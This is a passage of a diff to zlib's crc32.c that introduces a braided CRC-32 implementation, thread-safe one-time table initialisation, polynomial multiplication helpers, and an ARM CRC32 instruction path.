    \ can be #defined to write out crc32.h.\n+  MAKECRCH can be #defined to write\
    \ out crc32.h. A main() routine is also\n+  produced, so that this one source\
    \ file can be compiled to an executable.\n  */\n \n #ifdef MAKECRCH\n@@ -28,415\
    \ +27,1090 @@\n #  endif /* !DYNAMIC_CRC_TABLE */\n #endif /* MAKECRCH */\n \n\
    -#include \"zutil.h\"      /* for STDC and FAR definitions */\n+#include \"zutil.h\"\
    \      /* for Z_U4, Z_U8, z_crc_t, and FAR definitions */\n \n-/* Definitions\
    \ for doing the crc four data bytes at a time. */\n-#if !defined(NOBYFOUR) &&\
    \ defined(Z_U4)\n-#  define BYFOUR\n+ /*\n+  A CRC of a message is computed on\
    \ N braids of words in the message, where\n+  each word consists of W bytes (4\
    \ or 8). If N is 3, for example, then three\n+  running sparse CRCs are calculated\
    \ respectively on each braid, at these\n+  indices in the array of words: 0, 3,\
    \ 6, ..., 1, 4, 7, ..., and 2, 5, 8, ...\n+  This is done starting at a word boundary,\
    \ and continues until as many blocks\n+  of N * W bytes as are available have\
    \ been processed. The results are combined\n+  into a single CRC at the end. For\
    \ this code, N must be in the range 1..6 and\n+  W must be 4 or 8. The upper limit\
    \ on N can be increased if desired by adding\n+  more #if blocks, extending the\
    \ patterns apparent in the code. In addition,\n+  crc32.h would need to be regenerated,\
    \ if the maximum N value is increased.\n+\n+  N and W are chosen empirically by\
    \ benchmarking the execution time on a given\n+  processor. The choices for N\
    \ and W below were based on testing on Intel Kaby\n+  Lake i7, AMD Ryzen 7, ARM\
    \ Cortex-A57, Sparc64-VII, PowerPC POWER9, and MIPS64\n+  Octeon II processors.\
    \ The Intel, AMD, and ARM processors were all fastest\n+  with N=5, W=8. The Sparc,\
    \ PowerPC, and MIPS64 were all fastest at N=5, W=4.\n+  They were all tested with\
    \ either gcc or clang, all using the -O3 optimization\n+  level. Your mileage\
    \ may vary.\n+ */\n+\n+/* Define N */\n+#ifdef Z_TESTN\n+#  define N Z_TESTN\n\
    +#else\n+#  define N 5\n+#endif\n+#if N < 1 || N > 6\n+#  error N must be in 1..6\n\
    \ #endif\n-#ifdef BYFOUR\n-   local unsigned long crc32_little OF((unsigned long,\n\
    -                        const unsigned char FAR *, z_size_t));\n-   local unsigned\
    \ long crc32_big OF((unsigned long,\n-                        const unsigned char\
    \ FAR *, z_size_t));\n-#  define TBLS 8\n+\n+/*\n+  z_crc_t must be at least 32\
    \ bits. z_word_t must be at least as long as\n+  z_crc_t. It is assumed here that\
    \ z_word_t is either 32 bits or 64 bits, and\n+  that bytes are eight bits.\n\
    + */\n+\n+/*\n+  Define W and the associated z_word_t type. If W is not defined,\
    \ then a\n+  braided calculation is not used, and the associated tables and code\
    \ are not\n+  compiled.\n+ */\n+#ifdef Z_TESTW\n+#  if Z_TESTW-1 != -1\n+#   \
    \ define W Z_TESTW\n+#  endif\n #else\n-#  define TBLS 1\n-#endif /* BYFOUR */\n\
    +#  ifdef MAKECRCH\n+#    define W 8         /* required for MAKECRCH */\n+# \
    \ else\n+#    if defined(__x86_64__) || defined(__aarch64__)\n+#      define W\
    \ 8\n+#    else\n+#      define W 4\n+#    endif\n+#  endif\n+#endif\n+#ifdef\
    \ W\n+#  if W == 8 && defined(Z_U8)\n+     typedef Z_U8 z_word_t;\n+#  elif defined(Z_U4)\n\
    +#    undef W\n+#    define W 4\n+     typedef Z_U4 z_word_t;\n+#  else\n+#  \
    \  undef W\n+#  endif\n+#endif\n \n-/* Local functions for crc concatenation */\n\
    -local unsigned long gf2_matrix_times OF((unsigned long *mat,\n-             \
    \                            unsigned long vec));\n-local void gf2_matrix_square\
    \ OF((unsigned long *square, unsigned long *mat));\n-local uLong crc32_combine_\
    \ OF((uLong crc1, uLong crc2, z_off64_t len2));\n+/* Local functions. */\n+local\
    \ z_crc_t multmodp OF((z_crc_t a, z_crc_t b));\n+local z_crc_t x2nmodp OF((z_off64_t\
    \ n, unsigned k));\n \n+/* If available, use the ARM processor CRC32 instruction.\
    \ */\n+#if defined(__aarch64__) && defined(__ARM_FEATURE_CRC32) && W == 8\n+#\
    \  define ARMCRC32\n+#endif\n+\n+#if defined(W) && (!defined(ARMCRC32) || defined(DYNAMIC_CRC_TABLE))\n\
    +/*\n+  Swap the bytes in a z_word_t to convert between little and big endian.\
    \ Any\n+  self-respecting compiler will optimize this to a single machine byte-swap\n\
    +  instruction, if one is available. This assumes that word_t is either 32 bits\n\
    +  or 64 bits.\n+ */\n+local z_word_t byte_swap(word)\n+    z_word_t word;\n+{\n\
    +#  if W == 8\n+    return\n+        (word & 0xff00000000000000) >> 56 |\n+  \
    \      (word & 0xff000000000000) >> 40 |\n+        (word & 0xff0000000000) >>\
    \ 24 |\n+        (word & 0xff00000000) >> 8 |\n+        (word & 0xff000000) <<\
    \ 8 |\n+        (word & 0xff0000) << 24 |\n+        (word & 0xff00) << 40 |\n\
    +        (word & 0xff) << 56;\n+#  else   /* W == 4 */\n+    return\n+       \
    \ (word & 0xff000000) >> 24 |\n+        (word & 0xff0000) >> 8 |\n+        (word\
    \ & 0xff00) << 8 |\n+        (word & 0xff) << 24;\n+#  endif\n+}\n+#endif\n+\n\
    +/* CRC polynomial. */\n+#define POLY 0xedb88320         /* p(x) reflected, with\
    \ x^32 implied */\n \n #ifdef DYNAMIC_CRC_TABLE\n \n-local volatile int crc_table_empty\
    \ = 1;\n-local z_crc_t FAR crc_table[TBLS][256];\n+local z_crc_t FAR crc_table[256];\n\
    +local z_crc_t FAR x2n_table[32];\n local void make_crc_table OF((void));\n+#ifdef\
    \ W\n+   local z_word_t FAR crc_big_table[256];\n+   local z_crc_t FAR crc_braid_table[W][256];\n\
    +   local z_word_t FAR crc_braid_big_table[W][256];\n+   local void braid OF((z_crc_t\
    \ [][256], z_word_t [][256], int, int));\n+#endif\n #ifdef MAKECRCH\n-   local\
    \ void write_table OF((FILE *, const z_crc_t FAR *));\n+   local void write_table\
    \ OF((FILE *, const z_crc_t FAR *, int));\n+   local void write_table32hi OF((FILE\
    \ *, const z_word_t FAR *, int));\n+   local void write_table64 OF((FILE *, const\
    \ z_word_t FAR *, int));\n #endif /* MAKECRCH */\n+\n+/*\n+  Define a once() function\
    \ depending on the availability of atomics. If this is\n+  compiled with DYNAMIC_CRC_TABLE\
    \ defined, and if CRCs will be computed in\n+  multiple threads, and if atomics\
    \ are not available, then get_crc_table() must\n+  be called to initialize the\
    \ tables and must return before any threads are\n+  allowed to compute or combine\
    \ CRCs.\n+ */\n+\n+/* Definition of once functionality. */\n+typedef struct once_s\
    \ once_t;\n+local void once OF((once_t *, void (*)(void)));\n+\n+/* Check for\
    \ the availability of atomics. */\n+#if defined(__STDC__) && __STDC_VERSION__\
    \ >= 201112L && \\\n+    !defined(__STDC_NO_ATOMICS__)\n+\n+#include <stdatomic.h>\n\
    +\n+/* Structure for once(), which must be initialized with ONCE_INIT. */\n+struct\
    \ once_s {\n+    atomic_flag begun;\n+    atomic_int done;\n+};\n+#define ONCE_INIT\
    \ {ATOMIC_FLAG_INIT, 0}\n+\n+/*\n+  Run the provided init() function exactly once,\
    \ even if multiple threads\n+  invoke once() at the same time. The state must\
    \ be a once_t initialized with\n+  ONCE_INIT.\n+ */\n+local void once(state, init)\n\
    +    once_t *state;\n+    void (*init)(void);\n+{\n+    if (!atomic_load(&state->done))\
    \ {\n+        if (atomic_flag_test_and_set(&state->begun))\n+            while\
    \ (!atomic_load(&state->done))\n+                ;\n+        else {\n+       \
    \     init();\n+            atomic_store(&state->done, 1);\n+        }\n+    }\n\
    +}\n+\n+#else   /* no atomics */\n+\n+/* Structure for once(), which must be initialized\
    \ with ONCE_INIT. */\n+struct once_s {\n+    volatile int begun;\n+    volatile\
    \ int done;\n+};\n+#define ONCE_INIT {0, 0}\n+\n+/* Test and set. Alas, not atomic,\
    \ but tries to minimize the period of\n+   vulnerability. */\n+local int test_and_set\
    \ OF((int volatile *));\n+local int test_and_set(flag)\n+    int volatile *flag;\n\
    +{\n+    int was;\n+\n+    was = *flag;\n+    *flag = 1;\n+    return was;\n+}\n\
    +\n+/* Run the provided init() function once. This is not thread-safe. */\n+local\
    \ void once(state, init)\n+    once_t *state;\n+    void (*init)(void);\n+{\n\
    +    if (!state->done) {\n+        if (test_and_set(&state->begun))\n+       \
    \     while (!state->done)\n+                ;\n+        else {\n+           \
    \ init();\n+            state->done = 1;\n+        }\n+    }\n+}\n+\n+#endif\n\
    +\n+/* State for once(). */\n+local once_t made = ONCE_INIT;\n+\n /*\n   Generate\
    \ tables for a byte-wise 32-bit CRC calculation on the polynomial:\n   x^32+x^26+x^23+x^22+x^16+x^12+x^11+x^10+x^8+x^7+x^5+x^4+x^2+x+1.\n\
    \ \n   Polynomials over GF(2) are represented in binary, one bit per coefficient,\n\
    -  with the lowest powers in the most significant bit.  Then adding polynomials\n\
    +  with the lowest powers in the most significant bit. Then adding polynomials\n\
    \   is just exclusive-or, and multiplying a polynomial by x is a right shift by\n\
    -  one.  If we call the above polynomial p, and represent a byte as the\n+  one.\
    \ If we call the above polynomial p, and represent a byte as the\n   polynomial\
    \ q, also with the lowest power in the most significant bit (so the\n-  byte 0xb1\
    \ is the polynomial x^7+x^3+x+1), then the CRC is (q*x^32) mod p,\n+  byte 0xb1\
    \ is the polynomial x^7+x^3+x^2+1), then the CRC is (q*x^32) mod p,\n   where\
    \ a mod b means the remainder after dividing a by b.\n \n   This calculation is\
    \ done using the shift-register method of multiplying and\n-  taking the remainder.\
    \  The register is initialized to zero, and for each\n+  taking the remainder.\
    \ The register is initialized to zero, and for each\n   incoming bit, x^32 is\
    \ added mod p to the register if the bit is a one (where\n-  x^32 mod p is p+x^32\
    \ = x^26+...+1), and the register is multiplied mod p by\n-  x (which is shifting\
    \ right by one and adding x^32 mod p if the bit shifted\n-  out is a one).  We\
    \ start with the highest power (least significant bit) of\n-  q and repeat for\
    \ all eight bits of q.\n-\n-  The first table is simply the CRC of all possible\
    \ eight bit values.  This is\n-  all the information needed to generate CRCs on\
    \ data a byte at a time for all\n-  combinations of CRC register values and incoming\
    \ bytes.  The remaining tables\n-  allow for word-at-a-time CRC calculation for\
    \ both big-endian and little-\n-  endian machines, where a word is four bytes.\n\
    -*/\n+  x^32 mod p is p+x^32 = x^26+...+1), and the register is multiplied mod\
    \ p by x\n+  (which is shifting right by one and adding x^32 mod p if the bit\
    \ shifted out\n+  is a one). We start with the highest power (least significant\
    \ bit) of q and\n+  repeat for all eight bits of q.\n+\n+  The table is simply\
    \ the CRC of all possible eight bit values. This is all the\n+  information needed\
    \ to generate CRCs on data a byte at a time for all\n+  combinations of CRC register\
    \ values and incoming bytes.\n+ */\n+\n local void make_crc_table()\n {\n-   \
    \ z_crc_t c;\n-    int n, k;\n-    z_crc_t poly;                       /* polynomial\
    \ exclusive-or pattern */\n-    /* terms of polynomial defining this crc (except\
    \ x^32): */\n-    static volatile int first = 1;      /* flag to limit concurrent\
    \ making */\n-    static const unsigned char p[] = {0,1,2,4,5,7,8,10,11,12,16,22,23,26};\n\
    -\n-    /* See if another task is already doing this (not thread-safe, but better\n\
    -       than nothing -- significantly reduces duration of vulnerability in\n-\
    \       case the advice about DYNAMIC_CRC_TABLE is ignored) */\n-    if (first)\
    \ {\n-        first = 0;\n-\n-        /* make exclusive-or pattern from polynomial\
    \ (0xedb88320UL) */\n-        poly = 0;\n-        for (n = 0; n < (int)(sizeof(p)/sizeof(unsigned\
    \ char)); n++)\n-            poly |= (z_crc_t)1 << (31 - p[n]);\n-\n-        /*\
    \ generate a crc for every 8-bit value */\n-        for (n = 0; n < 256; n++)\
    \ {\n-            c = (z_crc_t)n;\n-            for (k = 0; k < 8; k++)\n-   \
    \             c = c & 1 ? poly ^ (c >> 1) : c >> 1;\n-            crc_table[0][n]\
    \ = c;\n-        }\n+    unsigned i, j, n;\n+    z_crc_t p;\n \n-#ifdef BYFOUR\n\
    -        /* generate crc for each value followed by one, two, and three zeros,\n\
    -           and then the byte reversal of those as well as the first table */\n\
    -        for (n = 0; n < 256; n++) {\n-            c = crc_table[0][n];\n-   \
    \         crc_table[4][n] = ZSWAP32(c);\n-            for (k = 1; k < 4; k++)\
    \ {\n-                c = crc_table[0][c & 0xff] ^ (c >> 8);\n-              \
    \  crc_table[k][n] = c;\n-                crc_table[k + 4][n] = ZSWAP32(c);\n\
    -            }\n-        }\n-#endif /* BYFOUR */\n-\n-        crc_table_empty\
    \ = 0;\n-    }\n-    else {      /* not first */\n-        /* wait for the other\
    \ guy to finish (not efficient, but rare) */\n-        while (crc_table_empty)\n\
    -            ;\n+    /* initialize the CRC of bytes tables */\n+    for (i = 0;\
    \ i < 256; i++) {\n+        p = i;\n+        for (j = 0; j < 8; j++)\n+      \
    \      p = p & 1 ? (p >> 1) ^ POLY : p >> 1;\n+        crc_table[i] = p;\n+#ifdef\
    \ W\n+        crc_big_table[i] = byte_swap(p);\n+#endif\n     }\n \n+    /* initialize\
    \ the x^2^n mod p(x) table */\n+    p = (z_crc_t)1 << 30;         /* x^1 */\n\
    +    x2n_table[0] = p;\n+    for (n = 1; n < 32; n++)\n+        x2n_table[n] =\
    \ p = multmodp(p, p);\n+\n+#ifdef W\n+    /* initialize the braiding tables --\
    \ needs x2n_table[] */\n+    braid(crc_braid_table, crc_braid_big_table, N, W);\n\
    +#endif\n+\n #ifdef MAKECRCH\n-    /* write out CRC tables to crc32.h */\n   \
    \  {\n+        /*\n+          The crc32.h header file contains tables for both\
    \ 32-bit and 64-bit\n+          z_word_t's, and so requires a 64-bit type be available.\
    \ In that case,\n+          z_word_t must be defined to be 64-bits. This code\
    \ then also generates\n+          and writes out the tables for the case that\
    \ z_word_t is 32 bits.\n+         */\n+#if !defined(W) || W != 8\n+#  error Need\
    \ a 64-bit integer type in order to generate crc32.h.\n+#endif\n         FILE\
    \ *out;\n+        int k, n;\n+        z_crc_t ltl[8][256];\n+        z_word_t\
    \ big[8][256];\n \n         out = fopen(\"crc32.h\", \"w\");\n         if (out\
    \ == NULL) return;\n-        fprintf(out, \"/* crc32.h -- tables for rapid CRC\
    \ calculation\\n\");\n-        fprintf(out, \" * Generated automatically by crc32.c\\\
    n */\\n\\n\");\n-        fprintf(out, \"local const z_crc_t FAR \");\n-      \
    \  fprintf(out, \"crc_table[TBLS][256] =\\n{\\n  {\\n\");\n-        write_table(out,\
    \ crc_table[0]);\n-#  ifdef BYFOUR\n-        fprintf(out, \"#ifdef BYFOUR\\n\"\
    );\n-        for (k = 1; k < 8; k++) {\n-            fprintf(out, \"  },\\n  {\\\
    n\");\n-            write_table(out, crc_table[k]);\n+\n+        /* write out\
    \ little-endian CRC table to crc32.h */\n+        fprintf(out,\n+            \"\
    /* crc32.h -- tables for rapid CRC calculation\\n\"\n+            \" * Generated\
    \ automatically by crc32.c\\n */\\n\"\n+            \"\\n\"\n+            \"local\
    \ const z_crc_t FAR crc_table[] = {\\n\"\n+            \"    \");\n+        write_table(out,\
    \ crc_table, 256);\n+        fprintf(out,\n+            \"};\\n\");\n+\n+    \
    \    /* write out big-endian CRC table for 64-bit z_word_t to crc32.h */\n+  \
    \      fprintf(out,\n+            \"\\n\"\n+            \"#ifdef W\\n\"\n+   \
    \         \"\\n\"\n+            \"#if W == 8\\n\"\n+            \"\\n\"\n+   \
    \         \"local const z_word_t FAR crc_big_table[] = {\\n\"\n+            \"\
    \    \");\n+        write_table64(out, crc_big_table, 256);\n+        fprintf(out,\n\
    +            \"};\\n\");\n+\n+        /* write out big-endian CRC table for 32-bit\
    \ z_word_t to crc32.h */\n+        fprintf(out,\n+            \"\\n\"\n+     \
    \       \"#else /* W == 4 */\\n\"\n+            \"\\n\"\n+            \"local\
    \ const z_word_t FAR crc_big_table[] = {\\n\"\n+            \"    \");\n+    \
    \    write_table32hi(out, crc_big_table, 256);\n+        fprintf(out,\n+     \
    \       \"};\\n\"\n+            \"\\n\"\n+            \"#endif\\n\");\n+\n+  \
    \      /* write out braid tables for each value of N */\n+        for (n = 1;\
    \ n <= 6; n++) {\n+            fprintf(out,\n+            \"\\n\"\n+         \
    \   \"#if N == %d\\n\", n);\n+\n+            /* compute braid tables for this\
    \ N and 64-bit word_t */\n+            braid(ltl, big, n, 8);\n+\n+          \
    \  /* write out braid tables for 64-bit z_word_t to crc32.h */\n+            fprintf(out,\n\
    +            \"\\n\"\n+            \"#if W == 8\\n\"\n+            \"\\n\"\n+\
    \            \"local const z_crc_t FAR crc_braid_table[][256] = {\\n\");\n+  \
    \          for (k = 0; k < 8; k++) {\n+                fprintf(out, \"   {\");\n\
    +                write_table(out, ltl[k], 256);\n+                fprintf(out,\
    \ \"}%s\", k < 7 ? \",\\n\" : \"\");\n+            }\n+            fprintf(out,\n\
    +            \"};\\n\"\n+            \"\\n\"\n+            \"local const z_word_t\
    \ FAR crc_braid_big_table[][256] = {\\n\");\n+            for (k = 0; k < 8; k++)\
    \ {\n+                fprintf(out, \"   {\");\n+                write_table64(out,\
    \ big[k], 256);\n+                fprintf(out, \"}%s\", k < 7 ? \",\\n\" : \"\"\
    );\n+            }\n+            fprintf(out,\n+            \"};\\n\");\n+\n+\
    \            /* compute braid tables for this N and 32-bit word_t */\n+      \
    \      braid(ltl, big, n, 4);\n+\n+            /* write out braid tables for 32-bit\
    \ z_word_t to crc32.h */\n+            fprintf(out,\n+            \"\\n\"\n+ \
    \           \"#else /* W == 4 */\\n\"\n+            \"\\n\"\n+            \"local\
    \ const z_crc_t FAR crc_braid_table[][256] = {\\n\");\n+            for (k = 0;\
    \ k < 4; k++) {\n+                fprintf(out, \"   {\");\n+                write_table(out,\
    \ ltl[k], 256);\n+                fprintf(out, \"}%s\", k < 3 ? \",\\n\" : \"\"\
    );\n+            }\n+            fprintf(out,\n+            \"};\\n\"\n+     \
    \       \"\\n\"\n+            \"local const z_word_t FAR crc_braid_big_table[][256]\
    \ = {\\n\");\n+            for (k = 0; k < 4; k++) {\n+                fprintf(out,\
    \ \"   {\");\n+                write_table32hi(out, big[k], 256);\n+         \
    \       fprintf(out, \"}%s\", k < 3 ? \",\\n\" : \"\");\n+            }\n+   \
    \         fprintf(out,\n+            \"};\\n\"\n+            \"\\n\"\n+      \
    \      \"#endif\\n\"\n+            \"\\n\"\n+            \"#endif\\n\");\n   \
    \      }\n-        fprintf(out, \"#endif\\n\");\n-#  endif /* BYFOUR */\n-   \
    \     fprintf(out, \"  }\\n};\\n\");\n+        fprintf(out,\n+            \"\\\
    n\"\n+            \"#endif\\n\");\n+\n+        /* write out zeros operator table\
    \ to crc32.h */\n+        fprintf(out,\n+            \"\\n\"\n+            \"\
    local const z_crc_t FAR x2n_table[] = {\\n\"\n+            \"    \");\n+     \
    \   write_table(out, x2n_table, 32);\n+        fprintf(out,\n+            \"};\\\
    n\");\n         fclose(out);\n     }\n #endif /* MAKECRCH */\n }\n \n #ifdef MAKECRCH\n\
    -local void write_table(out, table)\n+\n+/*\n+   Write the 32-bit values in table[0..k-1]\
    \ to out, five per line in\n+   hexadecimal separated by commas.\n+ */\n+local\
    \ void write_table(out, table, k)\n     FILE *out;\n     const z_crc_t FAR *table;\n\
    +    int k;\n {\n     int n;\n \n-    for (n = 0; n < 256; n++)\n-        fprintf(out,\
    \ \"%s0x%08lxUL%s\", n % 5 ? \"\" : \"    \",\n+    for (n = 0; n < k; n++)\n\
    +        fprintf(out, \"%s0x%08lx%s\", n == 0 || n % 5 ? \"\" : \"    \",\n  \
    \               (unsigned long)(table[n]),\n-                n == 255 ? \"\\n\"\
    \ : (n % 5 == 4 ? \",\\n\" : \", \"));\n+                n == k - 1 ? \"\" : (n\
    \ % 5 == 4 ? \",\\n\" : \", \"));\n }\n+\n+/*\n+   Write the high 32-bits of each\
    \ value in table[0..k-1] to out, five per line\n+   in hexadecimal separated by\
    \ commas.\n+ */\n+local void write_table32hi(out, table, k)\n+FILE *out;\n+const\
    \ z_word_t FAR *table;\n+int k;\n+{\n+    int n;\n+\n+    for (n = 0; n < k; n++)\n\
    +        fprintf(out, \"%s0x%08lx%s\", n == 0 || n % 5 ? \"\" : \"    \",\n+ \
    \               (unsigned long)(table[n] >> 32),\n+                n == k - 1\
    \ ? \"\" : (n % 5 == 4 ? \",\\n\" : \", \"));\n+}\n+\n+/*\n+  Write the 64-bit\
    \ values in table[0..k-1] to out, three per line in\n+  hexadecimal separated\
    \ by commas. This assumes that if there is a 64-bit\n+  type, then there is also\
    \ a long long integer type, and it is at least 64\n+  bits. If not, then the type\
    \ cast and format string can be adjusted\n+  accordingly.\n+ */\n+local void write_table64(out,\
    \ table, k)\n+    FILE *out;\n+    const z_word_t FAR *table;\n+    int k;\n+{\n\
    +    int n;\n+\n+    for (n = 0; n < k; n++)\n+        fprintf(out, \"%s0x%016llx%s\"\
    , n == 0 || n % 3 ? \"\" : \"    \",\n+                (unsigned long long)(table[n]),\n\
    +                n == k - 1 ? \"\" : (n % 3 == 2 ? \",\\n\" : \", \"));\n+}\n\
    +\n+/* Actually do the deed. */\n+int main()\n+{\n+    make_crc_table();\n+  \
    \  return 0;\n+}\n+\n #endif /* MAKECRCH */\n \n+#ifdef W\n+/*\n+  Generate the\
    \ little and big-endian braid tables for the given n and z_word_t\n+  size w.\
    \ Each array must have room for w blocks of 256 elements.\n+ */\n+local void braid(ltl,\
    \ big, n, w)\n+    z_crc_t ltl[][256];\n+    z_word_t big[][256];\n+    int n;\n\
    +    int w;\n+{\n+    int k;\n+    z_crc_t i, p, q;\n+    for (k = 0; k < w; k++)\
    \ {\n+        p = x2nmodp((n * w + 3 - k) << 3, 0);\n+        ltl[k][0] = 0;\n\
    +        big[w - 1 - k][0] = 0;\n+        for (i = 1; i < 256; i++) {\n+     \
    \       ltl[k][i] = q = multmodp(i << 24, p);\n+            big[w - 1 - k][i]\
    \ = byte_swap(q);\n+        }\n+    }\n+}\n+#endif\n+\n #else /* !DYNAMIC_CRC_TABLE\
    \ */\n /* ========================================================================\n\
    - * Tables of CRC-32s of all single-byte values, made by make_crc_table().\n+\
    \ * Tables for byte-wise and braided CRC-32 calculations, and a table of powers\n\
    + * of x for combining CRC-32s, all made by make_crc_table().\n  */\n #include\
    \ \"crc32.h\"\n #endif /* DYNAMIC_CRC_TABLE */\n \n+/* ========================================================================\n\
    + * Routines used for CRC calculation. Some are also required for the table\n\
    + * generation above.\n+ */\n+\n+/*\n+  Return a(x) multiplied by b(x) modulo\
    \ p(x), where p(x) is the CRC polynomial,\n+  reflected. For speed, this requires\
    \ that a not be zero.\n+ */\n+local z_crc_t multmodp(a, b)\n+    z_crc_t a;\n\
    +    z_crc_t b;\n+{\n+    z_crc_t m, p;\n+\n+    m = (z_crc_t)1 << 31;\n+    p\
    \ = 0;\n+    for (;;) {\n+        if (a & m) {\n+            p ^= b;\n+      \
    \      if ((a & (m - 1)) == 0)\n+                break;\n+        }\n+       \
    \ m >>= 1;\n+        b = b & 1 ? (b >> 1) ^ POLY : b >> 1;\n+    }\n+    return\
    \ p;\n+}\n+\n+/*\n+  Return x^(n * 2^k) modulo p(x). Requires that x2n_table[]\
    \ has been\n+  initialized.\n+ */\n+local z_crc_t x2nmodp(n, k)\n+    z_off64_t\
    \ n;\n+    unsigned k;\n+{\n+    z_crc_t p;\n+\n+    p = (z_crc_t)1 << 31;   \
    \        /* x^0 == 1 */\n+    while (n) {\n+        if (n & 1)\n+            p\
    \ = multmodp(x2n_table[k & 31], p);\n+        n >>= 1;\n+        k++;\n+    }\n\
    +    return p;\n+}\n+\n /* =========================================================================\n\
    - * This function can be used by asm versions of crc32()\n+ * This function can\
    \ be used by asm versions of crc32(), and to force the\n+ * generation of the\
    \ CRC tables in a threaded application.\n  */\n const z_crc_t FAR * ZEXPORT get_crc_table()\n\
    \ {\n #ifdef DYNAMIC_CRC_TABLE\n-    if (crc_table_empty)\n-        make_crc_table();\n\
    +    once(&made, make_crc_table);\n #endif /* DYNAMIC_CRC_TABLE */\n     return\
    \ (const z_crc_t FAR *)crc_table;\n }\n \n-/* =========================================================================\
    \ */\n-#define DO1 crc = crc_table[0][((int)crc ^ (*buf++)) & 0xff] ^ (crc >>\
    \ 8)\n-#define DO8 DO1; DO1; DO1; DO1; DO1; DO1; DO1; DO1\n+/* =========================================================================\n\
    + * Use ARM machine instructions if available. This will compute the CRC about\n\
    + * ten times faster than the braided calculation. This code does not check for\n\
    + * the presence of the CRC instruction at run time. __ARM_FEATURE_CRC32 will\n\
    + * only be defined if the compilation specifies an ARM processor architecture\n\
    + * that has the instructions. For example, compiling with -march=armv8.1-a or\n\
    + * -march=armv8-a+crc, or -march=native if the compile machine has the crc32\n\
    + * instructions.\n+ */\n+#ifdef ARMCRC32\n+\n+/*\n+   Constants empirically determined\
    \ to maximize speed. These values are from\n+   measurements on a Cortex-A57.\
    \ Your mileage may vary.\n+ */\n+#define Z_BATCH 3990                /* number\
    \ of words in a batch */\n+#define Z_BATCH_ZEROS 0xa10d3d0c    /* computed from\
    \ Z_BATCH = 3990 */\n+#define Z_BATCH_MIN 800             /* fewest words in a\
    \ final batch */\n \n-/* =========================================================================\
    \ */\n unsigned long ZEXPORT crc32_z(crc, buf, len)\n     unsigned long crc;\n\
    \     const unsigned char FAR *buf;\n     z_size_t len;\n {\n-    if (buf == Z_NULL)\
    \ return 0UL;\n+    z_crc_t val;\n+    z_word_t crc1, crc2;\n+    const z_word_t\
    \ *word;\n+    z_word_t val0, val1, val2;\n+    z_size_t last, last2, i;\n+  \
    \  z_size_t num;\n+\n+    /* Return initial CRC, if requested. */\n+    if (buf\
    \ == Z_NULL) return 0;\n \n #ifdef DYNAMIC_CRC_TABLE\n-    if (crc_table_empty)\n\
    -        make_crc_table();\n+    once(&made, make_crc_table);\n #endif /* DYNAMIC_CRC_TABLE\
    \ */\n \n-#ifdef BYFOUR\n-    if (sizeof(void *) == sizeof(ptrdiff_t)) {\n-  \
    \      z_crc_t endian;\n+    /* Pre-condition the CRC */\n+    crc ^= 0xffffffff;\n\
    \ \n-        endian = 1;\n-        if (*((unsigned char *)(&endian)))\n-     \
    \       return crc32_little(crc, buf, len);\n-        else\n-            return\
    \ crc32_big(crc, buf, len);\n+    /* Compute the CRC up to a word boundary. */\n\
    +    while (len && ((z_size_t)buf & 7) != 0) {\n+        len--;\n+        val\
    \ = *buf++;\n+        __asm__ volatile(\"crc32b %w0, %w0, %w1\" : \"+r\"(crc)\
    \ : \"r\"(val));\n     }\n-#endif /* BYFOUR */\n-    crc = crc ^ 0xffffffffUL;\n\
    -    while (len >= 8) {\n-        DO8;\n-        len -= 8;\n+\n+    /* Prepare\
    \ to compute the CRC on full 64-bit words word[0..num-1]. */\n+    word = (z_word_t\
    \ const *)buf;\n+    num = len >> 3;\n+    len &= 7;\n+\n+    /* Do three interleaved\
    \ CRCs to realize the throughput of one crc32x\n+       instruction per cycle.\
    \ Each CRC is calcuated on Z_BATCH words. The three\n+       CRCs are combined\
    \ into a single CRC after each set of batches. */\n+    while (num >= 3 * Z_BATCH)\
    \ {\n+        crc1 = 0;\n+        crc2 = 0;\n+        for (i = 0; i < Z_BATCH;\
    \ i++) {\n+            val0 = word[i];\n+            val1 = word[i + Z_BATCH];\n\
    +            val2 = word[i + 2 * Z_BATCH];\n+            __asm__ volatile(\"crc32x\
    \ %w0, %w0, %x1\" : \"+r\"(crc) : \"r\"(val0));\n+            __asm__ volatile(\"\
    crc32x %w0, %w0, %x1\" : \"+r\"(crc1) : \"r\"(val1));\n+            __asm__ volatile(\"\
    crc32x %w0, %w0, %x1\" : \"+r\"(crc2) : \"r\"(val2));\n+        }\n+        word\
    \ += 3 * Z_BATCH;\n+        num -= 3 * Z_BATCH;\n+        crc = multmodp(Z_BATCH_ZEROS,\
    \ crc) ^ crc1;\n+        crc = multmodp(Z_BATCH_ZEROS, crc) ^ crc2;\n     }\n\
    -    if (len) do {\n-        DO1;\n-    } while (--len);\n-    return crc ^ 0xffffffffUL;\n\
    -}\n \n-/* =========================================================================\
    \ */\n-unsigned long ZEXPORT crc32(crc, buf, len)\n-    unsigned long crc;\n-\
    \    const unsigned char FAR *buf;\n-    uInt len;\n-{\n-    return crc32_z(crc,\
    \ buf, len);\n+    /* Do one last smaller batch with the remaining words, if there\
    \ are enough\n+       to pay for the combination of CRCs. */\n+    last = num\
    \ / 3;\n+    if (last >= Z_BATCH_MIN) {\n+        last2 = last << 1;\n+      \
    \  crc1 = 0;\n+        crc2 = 0;\n+        for (i = 0; i < last; i++) {\n+   \
    \         val0 = word[i];\n+            val1 = word[i + last];\n+            val2\
    \ = word[i + last2];\n+            __asm__ volatile(\"crc32x %w0, %w0, %x1\" :\
    \ \"+r\"(crc) : \"r\"(val0));\n+            __asm__ volatile(\"crc32x %w0, %w0,\
    \ %x1\" : \"+r\"(crc1) : \"r\"(val1));\n+            __asm__ volatile(\"crc32x\
    \ %w0, %w0, %x1\" : \"+r\"(crc2) : \"r\"(val2));\n+        }\n+        word +=\
    \ 3 * last;\n+        num -= 3 * last;\n+        val = x2nmodp(last, 6);\n+  \
    \      crc = multmodp(val, crc) ^ crc1;\n+        crc = multmodp(val, crc) ^ crc2;\n\
    +    }\n+\n+    /* Compute the CRC on any remaining words. */\n+    for (i = 0;\
    \ i < num; i++) {\n+        val0 = word[i];\n+        __asm__ volatile(\"crc32x\
    \ %w0, %w0, %x1\" : \"+r\"(crc) : \"r\"(val0));\n+    }\n+    word += num;\n+\n\
    +    /* Complete the CRC on any remaining bytes. */\n+    buf = (const unsigned\
    \ char FAR *)word;\n+    while (len) {\n+        len--;\n+        val = *buf++;\n\
    +        __asm__ volatile(\"crc32b %w0, %w0, %w1\" : \"+r\"(crc) : \"r\"(val));\n\
    +    }\n+\n+    /* Return the CRC, post-conditioned. */\n+    return crc ^ 0xffffffff;\n\
